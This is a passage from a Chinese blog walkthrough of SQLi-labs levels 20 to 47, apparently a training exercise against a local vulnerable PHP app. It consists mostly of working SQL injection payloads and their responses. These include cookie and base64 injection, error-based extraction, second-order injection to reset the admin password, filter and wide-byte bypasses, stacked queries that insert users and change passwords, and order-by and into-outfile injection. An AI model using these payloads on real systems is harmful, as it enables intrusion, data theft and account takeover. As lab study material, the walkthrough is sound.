class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">登录成功后，测试注入点，发现对cookie进行修改，会报错，说注入攻击，即证明cookie有对内容进行数据查询</span><br><span class="line">将cookie换为Dhakkan，则不会报错</span><br><span class="line">经测试，为&#x27;闭合</span><br><span class="line">Cookie: uname=Dhakkan&#x27; and sleep(5)#</span><br><span class="line">成功实现延时盲注</span><br><span class="line">Cookie: uname=Dhakkan&#x27; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br><span class="line">注入成功，回显结果如下：</span><br><span class="line">Issue with your mysql: XPATH syntax error: &#x27;~D:/phpStudy/PHPTutorial/MySQL/~&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">登录成功后显示cookie为uname = YWRtaW4= </span><br><span class="line">经测试发现这个编码是admin,先经过base64编码,后经过url编码得到的</span><br><span class="line"></span><br><span class="line">将cookie值修改为admin&#x27;回显结果如下所示,同时返回报错</span><br><span class="line">uname = YWRtaW4n</span><br><span class="line">报错如下:</span><br><span class="line">&#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27;</span><br><span class="line">可是判断注入点存在,且由&#x27;)闭合</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">admin&#x27;) and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br><span class="line">经过编码后注入,成功回显</span><br><span class="line">Issue with your mysql: XPATH syntax error: &#x27;~D:/phpStudy/PHPTutorial/MySQL/~&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">同上题,登陆后cookie经过base64加密</span><br><span class="line">测试payload为admin&quot;</span><br><span class="line">报错,结果为</span><br><span class="line">&#x27;&quot;admin&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="line">故&quot;uname&quot;</span><br><span class="line"></span><br><span class="line">payload为</span><br><span class="line">admin&quot; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br><span class="line">成功回显数据库地址</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="page-2"><a href="#page-2" class="headerlink" title="page-2"></a>page-2</h1><h2 id="less-21-1"><a href="#less-21-1" class="headerlink" title="less-21"></a>less-21</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">经过测试cookie存在注入漏洞，cookie经过base64和url加密</span><br><span class="line">尝试注入admin&#x27;报错</span><br><span class="line">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">admin&#x27;) and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-22-1"><a href="#less-22-1" class="headerlink" title="less-22"></a>less-22</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">同上</span><br><span class="line">注入admin”报错如下</span><br><span class="line">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;admin&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">admin&quot; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;报错</span><br><span class="line">&#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">经测试 # --+ 等注释无法实现注释，依旧报错，无法通过注释绕过</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1显示正常</span><br><span class="line">?id=-1&#x27; union select 1,user(),&#x27;3注入成功</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#x27;3注入成功</span><br><span class="line">Your Login name:information_schema,challenges,mysql,performance_schema,security,test</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h4><p><img src="/2021/11/01/sqlilabs/image-20211118101835878.png" alt="image-20211118101835878"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">本关为二次排序注入的示范例。二次排序注入也成为存储型的注入，就是将可能导致</span><br><span class="line">sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以出发sql 注入。</span><br><span class="line">二次排序注入思路：</span><br><span class="line">1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务</span><br><span class="line">端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。</span><br><span class="line">2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的</span><br><span class="line">数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响</span><br><span class="line">应。</span><br><span class="line">3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。</span><br><span class="line">4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库</span><br><span class="line">中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服</span><br><span class="line">务端环境中执行。</span><br><span class="line">5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注</span><br><span class="line">入漏洞利用是否成功。</span><br><span class="line"></span><br><span class="line">网页打开便如上图所示，需要登录，但是不知道管理员的账号密码，可以通过二次注入形式实现注入。</span><br><span class="line">首先注册新的账号，将payload提前写入数据库，再想办法触发payload</span><br><span class="line">username：admin&#x27;#</span><br><span class="line">登录新账号成功，select 查询账户没有问题，登录的账户也为admin&#x27;#，修改密码存在注入漏洞，修改admin&#x27;#的密码会修改admin的密码，实现修改管理员密码。</span><br><span class="line"></span><br><span class="line">Sql 语句变为UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27;admin&#x27;#&#x27;AND</span><br><span class="line">password=&#x27;&#x27; ， 也就是执行了UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27;</span><br><span class="line">admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">25题会对注入的payload进行过滤，将or和and过滤掉</span><br><span class="line">所以需要将or和and替换为可以绕过过滤的符号，存在如下四种方法</span><br><span class="line">1、大小写变形Or,OR,oR</span><br><span class="line">2、编码，hex，urlencode</span><br><span class="line">3、添加注释/*or*/</span><br><span class="line">4、利用符号and=&amp;&amp; or=||</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,(select group_concat(username) from users),3--+</span><br><span class="line">响应：</span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4,admin&#x27;#,aaa</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,(select group_concat(username) from users,(select group_concat(password) from users))--+</span><br><span class="line">响应：</span><br><span class="line">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in D:\phpStudy\PHPTutorial\WWW\sqlilabs\Less-25a\index.php on line 37</span><br><span class="line">由于过滤or，password经过过滤变为passwd，查询错误。</span><br><span class="line">无法通过url加密绕过，服务器在接收到请求时，会将url加密解密后再进行过滤。</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h4><p><img src="/2021/11/01/sqlilabs/image-20211118102600687.png" alt="image-20211118102600687"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&#x27;</span><br><span class="line">报错</span><br><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">可得出是&#x27;闭合的字符串</span><br><span class="line">经过测试：or and （space）等都被过滤</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&#x27;/*or*/&#x27;1&#x27;=&#x27;1</span><br><span class="line">显示正常</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&#x27;/*and*/&#x27;1&#x27;=&#x27;2</span><br><span class="line">注入成功</span><br><span class="line"></span><br><span class="line">对于空格，有较多的方法：</span><br><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line"></span><br><span class="line"># 此处我的环境是ubuntu14.04+apache+mysql+php，可以解析%a0，此前在windows+wamp 测试，不能解析%a0。</span><br><span class="line"></span><br><span class="line">由于win无法解析以上可替换space的方法，无法成功注入，当原理与25一致</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h4><p><img src="/2021/11/01/sqlilabs/image-20211118153450695.png" alt="image-20211118153450695"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">过滤select和union</span><br><span class="line">绕过方法使用大小写混写</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-27/?id=100&#x27;unIon/*%0a*/SelEcT/*%0a*/1,database(),3||&#x27;1</span><br><span class="line">响应</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:1</span><br><span class="line"></span><br><span class="line">之前直接过滤%0a，将%0a注释后则可以实现空格功能</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-29/?id=1&#x27;</span><br><span class="line">报错</span><br><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">可得知单引号字符串</span><br><span class="line"></span><br><span class="line">payload绕过成功</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-29/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-29/?id=1&amp;id=-1&#x27;%20union%20select%201,2,3%20and%20%271%27=%271</span><br><span class="line">响应</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/image-20211119144644508.png" alt="image-20211119144644508"></p>
+<h4 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-30/?id=1&quot;--+</span><br><span class="line">返回正常</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-30/?id=1&amp;id=-2&quot; union select 1,2,3 or &quot;1&quot;=&quot;1</span><br><span class="line">响应</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:1</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-31/?id=9&quot;</span><br><span class="line">报错</span><br><span class="line">near &#x27;&quot;9&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br><span class="line">可知字符串为(&quot;string&quot;)</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-31/?id=9&amp;id=-1&quot;) union select 1,2,(&quot;3</span><br><span class="line">响应</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h4><p>宽字节注入：</p>
+<p>利用两个字节拼在一起可以组成一个汉字，（前一个ascii 码大于128 才能到汉字的范围）。利用汉字吃掉一个字符。</p>
+<ol>
+<li>%df 吃掉\ 具体的原因是urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li>
+<li>将\’ 中的\ 过滤掉，例如可以构造%**%5c%5c%27 的情况，后面的%5c 会被前面的%5c<br>给注释掉。这也是bypass 的一种方法。</li>
+</ol>
+<p>该题</p>
+<p><img src="/2021/11/01/sqlilabs/image-20211119152651946.png" alt="image-20211119152651946"></p>
+<p>上述函数为过滤‘ \ 的函数，将‘ 转为\’ ， 将\ 转为\ ，将“ 转为\”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-32/?id=-1%df%27union%20select%201,user(),3--+</span><br><span class="line">响应</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-33/?id=-1%df%27union%20select%201,user(),3--+</span><br><span class="line">响应</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h4><p>而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将‘ 转为utf-16 为􀯭 ‘ 。</p>
+<h4 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于注入点是数字型，所以直接写即可</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-35/?id=-1 union select 1,2,3</span><br><span class="line">响应</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h4><p>本题使用mysql_real_escape_string() 函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-36/?id=1%df&#x27;</span><br><span class="line">报错</span><br><span class="line">near &#x27;&#x27;1�\&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://127.0.0.1/sqlilabs/Less-36/?id=-1%df&#x27; union select 1,user(),3--+</span><br><span class="line">响应</span><br><span class="line">Your Login name:root@localhost</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似34，区别在于处理post 内容用的是mysql_real_escape_string()函数，而不是addslashes()函数</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h4><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>堆叠注入：将多条sql语句一起执行</p>
+<p>原理：通过添加<code>;</code>结束上一句命令，将两句合并执行</p>
+<p>局限性：不是每次都可以执行，收API或引擎不支持的限制，权限不足。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-38/?id=1&#x27;</span><br><span class="line">报错</span><br><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-38/?id=1%27;insert users(id,username,password) values (&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;1&#x27;)--+</span><br><span class="line">结果如下</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/image-20211120181312523.png" alt="image-20211120181312523"></p>
+<h4 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-39/?id=38--+</span><br><span class="line">响应</span><br><span class="line">Your Username is : less38</span><br><span class="line">Your Password is : 1</span><br><span class="line">注入点为数字型</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-39/?id=38;update users set password=&#x27;2&#x27; where id=&#x27;38&#x27;--+</span><br><span class="line">再次访问id38的less38结果如下</span><br><span class="line">Your Username is : less38</span><br><span class="line">Your Password is : 2</span><br><span class="line">成功实现堆叠注入</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-40/?id=38&#x27;);update users set password=&#x27;3&#x27; where id=&#x27;38&#x27;--+</span><br><span class="line">响应</span><br><span class="line">Your Username is : less38</span><br><span class="line">Your Password is : 3</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本题与40题的差距就是没有回显，在id后添加‘，“，没有回显</span><br><span class="line">payload</span><br><span class="line">http://10.211.55.4/sqlilabs/Less-41/?id=38; update users set password=4 where id=38--+</span><br><span class="line">回显</span><br><span class="line">Your Username is : less38</span><br><span class="line">Your Password is : 4</span><br><span class="line">注入成功</span><br><span class="line">本题为数字型注入</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">经过代码审计，可知用户名经过过滤，但密码没有过滤</span><br><span class="line">使用堆叠过滤</span><br><span class="line">用户名随意，</span><br><span class="line">密码：c&#x27;;creat table me like users#</span><br><span class="line">响应</span><br><span class="line">报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/01/sqlilabs/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8A%E5%8D%8810.39.45.png" alt="截屏2021-11-21 上午10.39.45"></p>
+<h4 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">还不确认为啥无法使用hackbar实现登陆</span><br><span class="line"></span><br><span class="line">经过测试</span><br><span class="line">在密码输入4‘</span><br><span class="line">报错</span><br><span class="line">&#x27;&#x27;4&#x27;&#x27;)&#x27;</span><br><span class="line">可得出注入点的类型为(&#x27;str&#x27;)</span><br><span class="line"></span><br><span class="line">在密码输入：c&#x27;);create table less-43 like users#</span><br><span class="line">显示错误filed，但是数据库已经创建成功，即注入成功</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">a&#x27;;insert into users(id,username,password) values (&#x27;44&#x27;,&#x27;less44&#x27;,&#x27;1&#x27;)#</span><br><span class="line">注入成功</span><br><span class="line"></span><br><span class="line">但是</span><br><span class="line">c&#x27;;create table less-44 like users#</span><br><span class="line">无法注入成功，应该是没有权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">a&#x27;);insert into users(id,username,password) values (&#x27;45&#x27;,&#x27;less45&#x27;,&#x27;1&#x27;)#</span><br><span class="line">注入成功</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h4><h5 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h5><p>order by 不能用union等进行注入</p>
+<ol>
+<li><p>直接添加注入语句：?sort&#x3D;(sql)</p>
+</li>
+<li><p>利用函数：?sort&#x3D;rand(sql) </p>
+<p>rand(ture)和 rand(false)的结果是不一样的。</p>
+</li>
+<li><p>利用and：?sort&#x3D;1 and sql(报错)</p>
+</li>
+</ol>
+<h5 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h5><p>报错注入例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1%20%20procedure%20analyse(extractvalue(rand(),con cat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
+
+<h5 id="Into-outfie-参数"><a href="#Into-outfie-参数" class="headerlink" title="Into outfie 参数"></a>Into outfie 参数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1%20into%20outfile%20%22c:\\wamp\\www\\sqllib\\test 1.txt%22</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br><span class="line">注入成功，弹出报错</span><br><span class="line">XPATH syntax error: &#x27;:5.5.53&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入点类型为字符类型&#x27;str&#x27;</span><br><span class="line">payload</span><br><span class="line">?sort=1&#x27;and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+</span><br><span class="line">响应</span><br><span class="line">Duplicate entry &#x27;::root@localhost::1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+
